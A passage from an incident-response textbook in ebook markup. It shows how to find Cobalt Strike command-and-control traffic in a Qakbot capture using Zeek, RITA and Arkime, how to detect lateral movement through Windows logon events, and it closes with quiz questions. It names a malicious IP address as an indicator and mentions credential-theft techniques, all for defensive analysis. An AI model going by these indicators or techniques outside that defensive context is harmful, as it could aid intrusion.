<p><span class="koboSpan" id="kobo.474.1">IDS tools such as Security Onion can focus attention very quickly on key indicators. </span><span class="koboSpan" id="kobo.474.2">Even without that, some</span><a id="_idIndexMarker1345"/><span class="koboSpan" id="kobo.475.1"> tools can give us data points</span><a id="_idIndexMarker1346"/><span class="koboSpan" id="kobo.476.1"> to focus on, specifically those regarding </span><span class="No-Break"><span class="koboSpan" id="kobo.477.1">C2 traffic.</span></span></p>
<h2 id="_idParaDest-270"><a id="_idTextAnchor277"/><span class="koboSpan" id="kobo.478.1">RITA</span></h2>
<p><span class="koboSpan" id="kobo.479.1">It is in very</span><a id="_idIndexMarker1347"/><span class="koboSpan" id="kobo.480.1"> rare circumstances that analysts</span><a id="_idIndexMarker1348"/><span class="koboSpan" id="kobo.481.1"> will have a full packet capture of the entire attack chain, but a review of the packet capture can provide us with some insight into how to identify potential command and control traffic simply by looking at the specific elements of network flow data. </span><span class="koboSpan" id="kobo.481.2">To start, let’s go ahead and use the tool RITA that was introduced in </span><a href="B18571_09.xhtml#_idTextAnchor156"><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.482.1">Chapter 9</span></em></span></a><span class="No-Break"><span class="koboSpan" id="kobo.483.1">:</span></span></p>
<ol>
<li value="1"><span class="koboSpan" id="kobo.484.1">First, we need to process the packet capture </span><span class="No-Break"><span class="koboSpan" id="kobo.485.1">with Zeek:</span></span><pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.486.1">dfir@ubuntu:~/rita$ zeek -C -r Squirrelwaffle_Qakbot.pcap</span></strong></pre></li>
<li><span class="koboSpan" id="kobo.487.1">Next, import the Zeek output </span><span class="No-Break"><span class="koboSpan" id="kobo.488.1">to RITA:</span></span><pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.489.1">dfir@ubuntu:~/rita$ rita import *.log Squirrelwaffle_Qakbot</span></strong></pre></li>
</ol>
<p><span class="koboSpan" id="kobo.490.1">The screenshot for reference is </span><span class="No-Break"><span class="koboSpan" id="kobo.491.1">as follows:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer317">
<span class="koboSpan" id="kobo.492.1"><img alt="Figure 15.29 – Packet capture Zeek import " src="image/B18571_15_029.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.493.1">Figure 15.29 – Packet capture Zeek import</span></p>
<ol>
<li value="3"><span class="koboSpan" id="kobo.494.1">Process</span><a id="_idIndexMarker1349"/><span class="koboSpan" id="kobo.495.1"> the PCAP to show beacons</span><a id="_idIndexMarker1350"/><span class="koboSpan" id="kobo.496.1"> and output it to a CSV file </span><span class="No-Break"><span class="koboSpan" id="kobo.497.1">for analysis:</span></span><pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.498.1">dfir@ubuntu:~/rita$ rita show-beacons Squirrelwaffle_Qakbot &gt; Beacons.csv</span></strong></pre></li>
</ol>
<p><span class="koboSpan" id="kobo.499.1">The results of the RITA analysis reveal many of the same IP addresses that we saw in the Security </span><span class="No-Break"><span class="koboSpan" id="kobo.500.1">Onion analysis:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer318">
<span class="koboSpan" id="kobo.501.1"><img alt="Figure 15.30 – RITA beacon IP addresses " src="image/B18571_15_030.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.502.1">Figure 15.30 – RITA beacon IP addresses</span></p>
<p><span class="koboSpan" id="kobo.503.1">This allows the</span><a id="_idIndexMarker1351"/><span class="koboSpan" id="kobo.504.1"> analyst to focus on specific IP </span><a id="_idIndexMarker1352"/><span class="koboSpan" id="kobo.505.1">addresses within the full packet capture and perform a more detailed analysis using a tool such </span><span class="No-Break"><span class="koboSpan" id="kobo.506.1">as Arkime.</span></span></p>
<h2 id="_idParaDest-271"><a id="_idTextAnchor278"/><span class="koboSpan" id="kobo.507.1">Arkime</span></h2>
<p><span class="koboSpan" id="kobo.508.1">Now that we have</span><a id="_idIndexMarker1353"/><span class="koboSpan" id="kobo.509.1"> identified some potential </span><a id="_idIndexMarker1354"/><span class="koboSpan" id="kobo.510.1">Command and Control IOCs, we can pivot to a tool that will give us some more insight into the traffic. </span><span class="koboSpan" id="kobo.510.2">While Wireshark is an option, in this instance, Arkime may be a better choice as it provides that flow-like view that is easier to look at. </span><span class="koboSpan" id="kobo.510.3">Let’s run the following query for the IP </span><span class="No-Break"><span class="koboSpan" id="kobo.511.1">address </span></span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.512.1">108.62.141.222</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.513.1">:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.514.1">
Ip.dst == 108.62.141.222</span></pre>
<p><span class="koboSpan" id="kobo.515.1">This provides some key details that are of interest. </span><span class="koboSpan" id="kobo.515.2">First, the destination port for this traffic is </span><strong class="source-inline"><span class="koboSpan" id="kobo.516.1">8888</span></strong><span class="koboSpan" id="kobo.517.1">, which is not in and of itself malicious but is not a standard port for HTTPS traffic. </span><span class="koboSpan" id="kobo.517.2">Second, there is a consistent byte back and forth with two spikes. </span><span class="koboSpan" id="kobo.517.3">The first of these is at the beginning of the traffic; then, there’s another later on. </span><span class="koboSpan" id="kobo.517.4">If we dig deeper into one of the packets, we will see that the traffic </span><span class="No-Break"><span class="koboSpan" id="kobo.518.1">is encrypted:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer319">
<span class="koboSpan" id="kobo.519.1"><img alt="Figure 15.31 – Cobalt Strike connections in Arkime " src="image/B18571_15_031.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.520.1">Figure 15.31 – Cobalt Strike connections in Arkime</span></p>
<p><span class="koboSpan" id="kobo.521.1">If we drill into one of the data streams, we will see that the data is encrypted. </span><span class="koboSpan" id="kobo.521.2">One area that analysts will </span><a id="_idIndexMarker1355"/><span class="koboSpan" id="kobo.522.1">often have no visibility into </span><a id="_idIndexMarker1356"/><span class="koboSpan" id="kobo.523.1">is the actual activity of the </span><span class="No-Break"><span class="koboSpan" id="kobo.524.1">C2 channel:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer320">
<span class="koboSpan" id="kobo.525.1"><img alt="Figure 15.32 – TCP stream " src="image/B18571_15_032.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.526.1">Figure 15.32 – TCP stream</span></p>
<p><span class="koboSpan" id="kobo.527.1">Finally, leveraging threat intelligence, analysts can input the IP address into a source such as AlienVault’s OTX, which reveals that the IP address </span><strong class="source-inline"><span class="koboSpan" id="kobo.528.1">108.62.141.222</span></strong><span class="koboSpan" id="kobo.529.1"> is associated with infrastructure utilizing </span><span class="No-Break"><span class="koboSpan" id="kobo.530.1">Cobalt Strike:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer321">
<span class="koboSpan" id="kobo.531.1"><img alt="Figure 15.33 – AlienVault OTX threat intelligence " src="image/B18571_15_033.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.532.1">Figure 15.33 – AlienVault OTX threat intelligence</span></p>
<p><span class="koboSpan" id="kobo.533.1">In some</span><a id="_idIndexMarker1357"/><span class="koboSpan" id="kobo.534.1"> instances, the first indication that an </span><a id="_idIndexMarker1358"/><span class="koboSpan" id="kobo.535.1">organization has been attacked is tools such as IDS and IPS systems that hit on a suspect connection. </span><span class="koboSpan" id="kobo.535.2">Other times, command and control traffic remains undetected. </span><span class="koboSpan" id="kobo.535.3">Determining how an adversary is maintaining control is critical to ensuring that that control is removed during eradication </span><span class="No-Break"><span class="koboSpan" id="kobo.536.1">and recovery.</span></span></p>
<h1 id="_idParaDest-272"><a id="_idTextAnchor279"/><span class="koboSpan" id="kobo.537.1">Investigating lateral movement techniques</span></h1>
<p><span class="koboSpan" id="kobo.538.1">When investigating </span><a id="_idIndexMarker1359"/><span class="koboSpan" id="kobo.539.1">lateral movement techniques, the primary technique that is used is the </span><strong class="bold"><span class="koboSpan" id="kobo.540.1">Exploitation of Remote Services [T1210]</span></strong><span class="koboSpan" id="kobo.541.1">. </span><span class="koboSpan" id="kobo.541.2">In this technique, the threat actor utilizes a combination of compromised credentials and existing remote access tools such as SMB and RDP to access other systems on the same network. </span><span class="koboSpan" id="kobo.541.3">Vulnerabilities such as EternalBlue were widely exploited by threat actors such as NotPetya, as well as malware variants such </span><span class="No-Break"><span class="koboSpan" id="kobo.542.1">as Trickbot.</span></span></p>
<p><span class="koboSpan" id="kobo.543.1">The primary source of data that should be leveraged to identify lateral movement is NetFlow. </span><span class="koboSpan" id="kobo.543.2">As we saw in </span><a href="B18571_09.xhtml#_idTextAnchor156"><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.544.1">Chapter 9</span></em></span></a><span class="koboSpan" id="kobo.545.1">, a review of NetFlow can often reveal the use of SMB or RDP through multiple connections from one or a few machines to the rest of the network over a short period. </span><span class="koboSpan" id="kobo.545.2">For example, a systems administrator that is performing remote maintenance on a server within a server LAN segment will RDP to a single box, perform some of the maintenance tasks over say a 10- to 15-minute period, and then move to another system. </span><span class="koboSpan" id="kobo.545.3">It is highly suspect to see a non-administrator system initiate an RDP connection, let alone dozens in a matter </span><span class="No-Break"><span class="koboSpan" id="kobo.546.1">of minutes.</span></span></p>
<p><span class="koboSpan" id="kobo.547.1">If NetFlow is</span><a id="_idIndexMarker1360"/><span class="koboSpan" id="kobo.548.1"> not available, Windows Event Logs can provide some critical details as to how a threat actor was able to access a remote image. </span><span class="koboSpan" id="kobo.548.2">The first place to start is the Windows Security Event Log 4624, which indicates that a user or administrator has successfully logged on. </span><span class="koboSpan" id="kobo.548.3">In this case, we are interested in two types of logons: the SMB or remote share logon and the remote </span><span class="No-Break"><span class="koboSpan" id="kobo.549.1">desktop logon.</span></span></p>
<p><span class="koboSpan" id="kobo.550.1">In the remote share or SMB logon, the threat actor will often use a post-exploitation framework that can use SMB to pivot to another system. </span><span class="koboSpan" id="kobo.550.2">On the remote system that the threat actor is connecting to, an Event ID 4624 Type 3 entry will be made in the Windows Event Log, such as the one </span><span class="No-Break"><span class="koboSpan" id="kobo.551.1">that follows:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer322">
<span class="koboSpan" id="kobo.552.1"><img alt="Figure 15.34 – SMB logon event log entry " src="image/B18571_15_034.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.553.1">Figure 15.34 – SMB logon event log entry</span></p>
<p><span class="koboSpan" id="kobo.554.1">As can be </span><a id="_idIndexMarker1361"/><span class="koboSpan" id="kobo.555.1">seen</span><a id="_idIndexMarker1362"/><span class="koboSpan" id="kobo.556.1"> in the log entry, the system DEKSTOP-9SK5KPF was logged in with the account Atomic Red Team. </span><span class="koboSpan" id="kobo.556.2">Drilling further down into the entry, we can see the IP address </span><strong class="source-inline"><span class="koboSpan" id="kobo.557.1">192.168.0.22</span></strong><span class="koboSpan" id="kobo.558.1"> associated with the system LAPTOP-CHL1KGT5, indicating that was the machine that initiated </span><span class="No-Break"><span class="koboSpan" id="kobo.559.1">the connection:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer323">
<span class="koboSpan" id="kobo.560.1"><img alt="Figure 15.35 – SMB logon entry details " src="image/B18571_15_035.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.561.1">Figure 15.35 – SMB logon entry details</span></p>
<p><span class="koboSpan" id="kobo.562.1">The other type of</span><a id="_idIndexMarker1363"/><span class="koboSpan" id="kobo.563.1"> logon that we can see in the Windows Event Logs is RDP connections. </span><span class="koboSpan" id="kobo.563.2">The same Event ID, 4624, is used but with RDP connections, there are two types of logon types. </span><span class="koboSpan" id="kobo.563.3">The first is a type 10. </span><span class="koboSpan" id="kobo.563.4">This indicates that a new RDP connection was made to a system. </span><span class="koboSpan" id="kobo.563.5">A type 7 indicates that the remote machine is reconnecting from a previous session or had not properly logged off the last time a session </span><span class="No-Break"><span class="koboSpan" id="kobo.564.1">was established:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer324">
<span class="koboSpan" id="kobo.565.1"><img alt="Figure 15.36 – RDP logon entry " src="image/B18571_15_036.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.566.1">Figure 15.36 – RDP logon entry</span></p>
<p><span class="koboSpan" id="kobo.567.1">Again, digging </span><a id="_idIndexMarker1364"/><span class="koboSpan" id="kobo.568.1">through the entry, the logs provide</span><a id="_idIndexMarker1365"/><span class="koboSpan" id="kobo.569.1"> the same information that we saw in the type </span><span class="No-Break"><span class="koboSpan" id="kobo.570.1">7 event:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer325">
<span class="koboSpan" id="kobo.571.1"><img alt="Figure 15.37 – RDP logon entry details " src="image/B18571_15_037.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.572.1">Figure 15.37 – RDP logon entry details</span></p>
<p><span class="koboSpan" id="kobo.573.1">Conducting this</span><a id="_idIndexMarker1366"/><span class="koboSpan" id="kobo.574.1"> type of analysis does not scale with large-scale incidents, so the best approach is to use a SIEM or another platform such as Skadi. </span><span class="koboSpan" id="kobo.574.2">In this case, we can still get the same data, as </span><span class="No-Break"><span class="koboSpan" id="kobo.575.1">shown here:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.576.1">
[4624 / 0x1210] Source Name: Microsoft-Windows-Security-Auditing Strings: ['S-1-5-18', 'DESKTOP-9SK5KPF$', 'WORKGROUP', '0x00000000000003e7', 'S-1-5-21-3785962752-1303019572-1054719619-1001', 'Atomic Red Team', 'DESKTOP-9SK5KPF', '0x00000000087e1208', '7', 'User32 ', 'Negotiate', 'DESKTOP-9SK5KPF', '{00000000-0000-0000-0000-000000000000}', '-', '-', '0', '0x0000000000000520', 'C:\Windows\System32\svchost.exe', '192.168.0.22', '0', '%%1833', '-', '-', '-', '%%1843', '0x00000000087e11e6', '%%1843'] Computer Name: DESKTOP-9SK5KPF Record Number: 99549 Event Level: 0</span></pre>
<p><span class="koboSpan" id="kobo.577.1">With that we</span><a id="_idIndexMarker1367"/><span class="koboSpan" id="kobo.578.1"> have concluded how to investigate lateral </span><span class="No-Break"><span class="koboSpan" id="kobo.579.1">movement techniques.</span></span></p>
<h1 id="_idParaDest-273"><a id="_idTextAnchor280"/><span class="koboSpan" id="kobo.580.1">Summary</span></h1>
<p><span class="koboSpan" id="kobo.581.1">The unfortunate reality of the situation is that ransomware is here to stay. </span><span class="koboSpan" id="kobo.581.2">The takeaway from that is that responders and analysts need to be able to identify, extract, and analyze evidence related to these types of attacks. </span><span class="koboSpan" id="kobo.581.3">In this chapter, we learned how to examine a common initial infection vector, how to determine the theft of credentials, how to detect lateral movement, and how to identify the threat actor’s command and control. </span><span class="koboSpan" id="kobo.581.4">This is a solid starting point, and it is imperative to keep up to date with how threat actors operate through the continuous review and incorporation of </span><span class="No-Break"><span class="koboSpan" id="kobo.582.1">threat intelligence.</span></span></p>
<p><span class="koboSpan" id="kobo.583.1">In the next chapter, we will look at how to apply the tools and techniques we have examined in previous chapters to the proactive practice of </span><span class="No-Break"><span class="koboSpan" id="kobo.584.1">threat hunting.</span></span></p>
<h1 id="_idParaDest-274"><a id="_idTextAnchor281"/><span class="koboSpan" id="kobo.585.1">Questions</span></h1>
<p><span class="koboSpan" id="kobo.586.1">Answer the following questions to test your knowledge of </span><span class="No-Break"><span class="koboSpan" id="kobo.587.1">this chapter:</span></span></p>
<ol>
<li value="1"><span class="koboSpan" id="kobo.588.1">Which of these is not a </span><span class="No-Break"><span class="koboSpan" id="kobo.589.1">post-exploitation framework?</span></span><ol><li><span class="No-Break"><span class="koboSpan" id="kobo.590.1">Cobalt Strike</span></span></li><li><span class="No-Break"><span class="koboSpan" id="kobo.591.1">Metasploit</span></span></li><li><span class="No-Break"><span class="koboSpan" id="kobo.592.1">ProcDump</span></span></li><li><span class="No-Break"><span class="koboSpan" id="kobo.593.1">PowerSploit</span></span></li></ol></li>
<li><span class="koboSpan" id="kobo.594.1">Windows OS credentials are stored in </span><span class="No-Break"><span class="koboSpan" id="kobo.595.1">what process?</span></span><ol><li><span class="No-Break"><span class="koboSpan" id="kobo.596.1">LSASS</span></span></li><li><span class="No-Break"><span class="koboSpan" id="kobo.597.1">Services</span></span></li><li><span class="No-Break"><span class="koboSpan" id="kobo.598.1">Netstat</span></span></li><li><span class="No-Break"><span class="koboSpan" id="kobo.599.1">credsman</span></span></li></ol></li>
<li><span class="koboSpan" id="kobo.600.1">The use of Rundll32 can be observed within the </span><span class="No-Break"><span class="koboSpan" id="kobo.601.1">Prefetch files.</span></span><ol><li><span class="No-Break"><span class="koboSpan" id="kobo.602.1">True</span></span></li><li><span class="No-Break"><span class="koboSpan" id="kobo.603.1">False</span></span></li></ol></li>
<li><span class="koboSpan" id="kobo.604.1">What type of Windows Security Event Log is indicative of a Remote </span><span class="No-Break"><span class="koboSpan" id="kobo.605.1">Desktop Connection?</span></span><ol><li><span class="koboSpan" id="kobo.606.1">Event ID 4625 </span><span class="No-Break"><span class="koboSpan" id="kobo.607.1">Type 3</span></span></li><li><span class="koboSpan" id="kobo.608.1">Event ID 4625 </span><span class="No-Break"><span class="koboSpan" id="kobo.609.1">Type 10</span></span></li><li><span class="koboSpan" id="kobo.610.1">Event ID 4624 </span><span class="No-Break"><span class="koboSpan" id="kobo.611.1">Type 3</span></span></li><li><span class="koboSpan" id="kobo.612.1">Event ID 4264 </span><span class="No-Break"><span class="koboSpan" id="kobo.613.1">Type 10</span></span></li></ol></li>
</ol>
<h1 id="_idParaDest-275"><a id="_idTextAnchor282"/><span class="koboSpan" id="kobo.614.1">Further reading</span></h1>
<p><span class="koboSpan" id="kobo.615.1">Refer to the following for more details about the topics covered in </span><span class="No-Break"><span class="koboSpan" id="kobo.616.1">this chapter:</span></span></p>
<ul>
<li><em class="italic"><span class="koboSpan" id="kobo.617.1">Cobalt Strike PowerShell </span></em><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.618.1">Analysis</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.619.1">:</span></span><a href=" https://michaelkoczwara.medium.com/cobalt-strike-powershell-payload-analysis-eecf74b3c2f7 "><span class="No-Break"><span class="koboSpan" id="kobo.620.1"> https://michaelkoczwara.medium.com/cobalt-strike-powershell-payload-analysis-eecf74b3c2f7</span></span></a></li>
<li><em class="italic"><span class="koboSpan" id="kobo.621.1">Deobfuscating </span></em><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.622.1">PowerShell</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.623.1">: </span></span><a href="https://medium.com/mii-cybersec/malicious-powershell-deobfuscation-using-cyberchef-dfb9faff29f "><span class="No-Break"><span class="koboSpan" id="kobo.624.1">https://medium.com/mii-cybersec/malicious-powershell-deobfuscation-using-cyberchef-dfb9faff29f</span></span></a></li>
<li><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.625.1">CyberChef</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.626.1">: </span></span><a href="https://docs.securityonion.net/en/2.3/cyberchef.html"><span class="No-Break"><span class="koboSpan" id="kobo.627.1">https://docs.securityonion.net/en/2.3/cyberchef.html</span></span></a></li>
</ul>
</div>


<div class="Content" id="_idContainer327">
<h1 id="_idParaDest-276"><a id="_idTextAnchor283"/><span class="koboSpan" id="kobo.1.1">Part 5: Threat Intelligence and Hunting</span></h1>
<p><span class="koboSpan" id="kobo.2.1">To supplement the first three parts of the book, Part 5 delves into several of the specialized aspects of incident response and digital forensics that have a direct impact on the successful investigation of incidents. </span><span class="koboSpan" id="kobo.2.2">These topics include the analysis of malicious code, the integration of threat intelligence, and how to integrate various digital forensic techniques into the practice of </span><span class="No-Break"><span class="koboSpan" id="kobo.3.1">threat hunting.</span></span></p>
<p><span class="koboSpan" id="kobo.4.1">This part comprises the </span><span class="No-Break"><span class="koboSpan" id="kobo.5.1">following chapters:</span></span></p>
<ul>
<li><a href="B18571_16.xhtml#_idTextAnchor284"><em class="italic"><span class="koboSpan" id="kobo.6.1">Chapter 16</span></em></a><em class="italic"><span class="koboSpan" id="kobo.7.1">, Malware Analysis for Incident Response</span></em></li>
<li><a href="B18571_17.xhtml#_idTextAnchor304"><em class="italic"><span class="koboSpan" id="kobo.8.1">Chapter 17</span></em></a><em class="italic"><span class="koboSpan" id="kobo.9.1">, Leveraging Threat Intelligence</span></em></li>
<li><a href="B18571_18.xhtml#_idTextAnchor323"><em class="italic"><span class="koboSpan" id="kobo.10.1">Chapter 18</span></em></a><em class="italic"><span class="koboSpan" id="kobo.11.1">, Threat Hunting</span></em></li>
</ul>
</div>
<div>
<div id="_idContainer328">
</div>
</div>
</body></html>